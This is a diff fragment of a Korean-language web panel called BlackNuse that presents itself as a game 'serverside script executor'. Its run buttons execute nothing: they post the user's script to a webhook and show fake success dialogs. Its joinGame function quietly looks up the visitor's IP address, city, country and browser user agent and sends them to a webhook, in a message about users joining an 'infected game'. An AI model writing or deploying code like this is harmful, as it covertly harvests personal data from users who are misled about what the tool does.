+                            comments: false,
+                            strings: false
+                        },
+                        parameterHints: {
+                            enabled: true
+                        },
+                        wordBasedSuggestions: true,
+                        folding: true,
+                        foldingStrategy: 'indentation',
+                        showFoldingControls: 'always',
+                        wordWrap: 'on',
+                        wrappingIndent: 'indent'
+                    });
+                    
+                    const savedScript = localStorage.getItem('blacknuse-script');
+                    if (savedScript) {
+                        editor.setValue(savedScript);
+                    }
+
+                    editor.onDidChangeModelContent(() => {
+                        localStorage.setItem('blacknuse-script', editor.getValue());
+                    });
+                    
+                    console.log('Monaco Editor 초기화 완료');
+                } catch (error) {
+                    console.error('Monaco Editor 초기화 실패:', error);
+                }
+            });
+        }
+
+        // 실행기 함수들
+        function clearEditor() {
+            if (editor) {
+                editor.setValue('');
+                localStorage.removeItem('blacknuse-script');
+            }
+        }
+
+        async function executeScript() {
+            if (editor && currentUser) {
+                const script = editor.getValue();
+                
+                const users = getUsers();
+                const userIndex = users.findIndex(u => u.id === currentUser.id);
+                if (userIndex !== -1) {
+                    users[userIndex].scriptsExecuted = (users[userIndex].scriptsExecuted || 0) + 1;
+                    saveUsers(users);
+                    currentUser.scriptsExecuted = users[userIndex].scriptsExecuted;
+                }
+                
+                await sendExecutionWebhook('스크립트 실행', script);
+                
+                document.getElementById('script-status').classList.add('active');
+                setTimeout(() => {
+                    document.getElementById('script-status').classList.remove('active');
+                }, 3000);
+                
+                Swal.fire({
+                    title: '실행 완료',
+                    text: '스크립트가 성공적으로 실행되었습니다',
+                    icon: 'success',
+                    confirmButtonText: '확인'
+                });
+            }
+        }
+
+        async function executeR6() {
+            if (currentUser) {
+                const users = getUsers();
+                const userIndex = users.findIndex(u => u.id === currentUser.id);
+                if (userIndex !== -1) {
+                    users[userIndex].scriptsExecuted = (users[userIndex].scriptsExecuted || 0) + 1;
+                    saveUsers(users);
+                    currentUser.scriptsExecuted = users[userIndex].scriptsExecuted;
+                }
+            }
+            
+            await sendExecutionWebhook('R6 실행');
+            
+            document.getElementById('script-status').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('script-status').classList.remove('active');
+            }, 3000);
+            
+            Swal.fire({
+                title: 'R6 실행',
+                text: 'R6 스크립트가 실행되었습니다.',
+                icon: 'success',
+                confirmButtonText: '확인'
+            });
+        }
+
+        async function executeRE() {
+            if (currentUser) {
+                const users = getUsers();
+                const userIndex = users.findIndex(u => u.id === currentUser.id);
+                if (userIndex !== -1) {
+                    users[userIndex].scriptsExecuted = (users[userIndex].scriptsExecuted || 0) + 1;
+                    saveUsers(users);
+                    currentUser.scriptsExecuted = users[userIndex].scriptsExecuted;
+                }
+            }
+            
+            await sendExecutionWebhook('RE 실행');
+            
+            document.getElementById('script-status').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('script-status').classList.remove('active');
+            }, 3000);
+            
+            Swal.fire({
+                title: 'RE 실행',
+                text: '리스폰이 되었습니다.',
+                icon: 'success',
+                confirmButtonText: '확인'
+            });
+        }
+
+        // 게임 접속 함수
+        async function joinGame(gameId) {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+
+                const gameNames = {
+                    'test1': '테스트1',
+                    'test2': '테스트2'
+                };
+
+                const gameName = gameNames[gameId] || gameId;
+
+                const embed = {
+                    title: '🎮 게임 접속 감지',
+                    description: `사용자가 감염된 게임에 접속했습니다.`,
+                    color: 0x4caf50,
+                    fields: [
+                        { name: '게임 이름', value: gameName, inline: true },
+                        { name: 'IP 주소', value: userIP, inline: true },
+                        { name: '위치', value: `${locationData.city || '알 수 없음'}, ${locationData.country_name || '알 수 없음'}`, inline: true },
+                        { name: '접속 시간', value: new Date().toLocaleString('ko-KR'), inline: false },
+                        { name: '브라우저', value: navigator.userAgent, inline: false }
+                    ],
+                    footer: {
+                        text: 'BlackNuse Game System'
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+
+                Swal.fire({
+                    title: '게임 접속 중...',
+                    text: `${gameName}에 접속하고 있습니다.`,
+                    icon: 'info',
+                    timer: 2000,
+                    showConfirmButton: false,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    }
+                }).then(() => {
+                    Swal.fire({
+                        title: '접속 완료!',
+                        text: `${gameName}에 성공적으로 접속했습니다. 서버사이드 스크립트를 실행할 수 있습니다.`,
+                        icon: 'success',
+                        confirmButtonText: '확인'
+                    });
+                });
+
+            } catch (error) {
+                console.error('게임 접속 실패:', error);
+                Swal.fire({
+                    title: '접속 실패',
+                    text: '게임 접속 중 오류가 발생했습니다.',
+                    icon: 'error',
+                    confirmButtonText: '확인'
+                });
+            }
+        }
+
+        // 섹션 전환 함수
+        function showSection(sectionName) {
+            const sections = document.querySelectorAll('.section');
+            sections.forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            const navLinks = document.querySelectorAll('.sidebar li a');
+            navLinks.forEach(link => link.classList.remove('active'));
+            
+            const targetSection = document.getElementById(sectionName + '-section');
+            if (targetSection) {
+                targetSection.classList.add('active');
+                
+                const activeLink = document.querySelector(`[data-section="${sectionName}"]`);
+                if (activeLink) {
+                    activeLink.classList.add('active');
+                }
+            }
+        }
+
+        function logout() {
+            Swal.fire({
+                title: '로그아웃',
+                text: '정말 로그아웃하시겠습니까?',
+                icon: 'question',
+                showCancelButton: true,
+                confirmButtonText: '로그아웃',
+                cancelButtonText: '취소'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    localStorage.removeItem('blacknuse-current-user');
+                    window.location.href = 'index.html';
+                }
+            });
+        }
+
+        // 초기화 함수
+        async function init() {
+            const isVPN = await detectVPN();
+            if (!isVPN) return;
+
+            currentUser = getCurrentUser();
+            if (!currentUser) {
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            updateUserInterface();
+            initializeEditor();
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
